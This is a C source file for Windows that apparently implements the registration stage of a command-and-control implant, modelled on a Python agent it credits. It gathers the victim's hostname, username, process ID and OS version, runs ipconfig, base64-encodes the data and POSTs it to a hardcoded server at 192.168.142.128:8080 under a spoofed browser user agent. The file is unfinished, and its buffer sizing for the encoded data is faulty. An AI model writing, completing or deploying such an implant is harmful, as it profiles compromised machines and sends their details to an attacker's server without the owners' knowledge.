#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <wincrypt.h>

// Socket globals

struct AgentRegistration {
    // Credit to https://github.com/CodeXTF2/PyHmmm/blob/master/agent.py
        /* 
        # Register info:
        #   - AgentID           : int [needed]
        #   - Hostname          : CHAR [needed]
        #   - Username          : CHAR [needed]
        #   - Domain            : str [optional]
        #   - InternalIP        : str [needed]
        #   - Process Path      : str [needed]
        #   - Process Name      : str [needed]
        #   - Process ID        : DWORD [needed]
        #   - Process Parent ID : int [optional]
        #   - Process Arch      : str [needed]
        #   - OS Build          : str [needed]
        #   - OS Version        : str [needed]
        #   - OS Arch           : str [optional]
        */
    //int AgentID;
    char Hostname[260];
    char Username[260];
    //char IP[260];
    //char Domain[];
    //char Address[];
    //char Path[];
    //char Name[];
    DWORD ProcId; 
    //int ProcParentID[];
    //char ProcArch[];
    //char Build[];
    DWORD Version;
    //char OSArch[];
}Register;

struct AgentInformation {
    char *Address;
    char *UserAgent;
    int Port;
    char *Path;
}Agent;

void Registration() {
    DWORD HostnameLength = 260;
    if (GetComputerNameA(Register.Hostname, &HostnameLength)) {
        printf("Hostname: %s \n", Register.Hostname);
    }

    DWORD UsernameBuffer = 260;
    if (GetUserNameA(Register.Username, &UsernameBuffer)) {
        printf("Username: %s \n", Register.Username);
    }

    if (Register.ProcId = GetCurrentProcessId()) {
        printf("Process ID: %lu \n", Register.ProcId);
    }

    if (Register.Version = GetVersion()) {
        printf("Host Version: %lu \n", Register.Version);
    }
    system("C:\\Windows\\System32\\ipconfig"); // This is a really bad implementation. Change this
}

void Init() {
    Agent.Address = "192.168.142.128";
    Agent.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 ";
    Agent.Port = 8080;
    Agent.Path = "/";   

    // Define data format
    char *format = "%s\n%s\n%d\n%d";

    // Allocate data to encode
    char *data_to_encode = malloc(strlen(format) + strlen(Register.Username) + strlen(Register.Hostname));
    sprintf(data_to_encode, format, Register.Username, Register.Hostname, Register.ProcId, Register.Version);

    // Encode data to be encoded
    char *encode_data = malloc(strlen(data_to_encode) * 2);
    DWORD encode_data_len = strlen(data_to_encode) * 2;
    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encode_data, &encode_data_len);

    // Create buffer to be sent
    DWORD post_buffer_length = strlen(encode_data) + 5;
    CHAR *post_buffer = (CHAR*)calloc(strlen(encode_data) + 5, sizeof(CHAR));
    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", encode_data);

    // Create buffer to allocate space in headers
    CHAR content_length[MAX_PATH];
    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);


    HINTERNET hInternet = InternetOpenA(Agent.UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
    if (hInternet != NULL) {
        HINTERNET hConnect = InternetConnectA(hInternet, Agent.Address, Agent.Port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect != NULL) {
            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", Agent.Path, 0, 0, 0, 0, 0);
            if (hRequest != NULL) {
                HttpAddRequestHeaders(hRequest, content_length, -1, HTTP_ADDREQ_FLAG_ADD);
                HttpSendRequest(hRequest, 0, 0, post_buffer, post_buffer_length);
            }
        }
    }
}


int main() {
    Registration();    
    Init();
}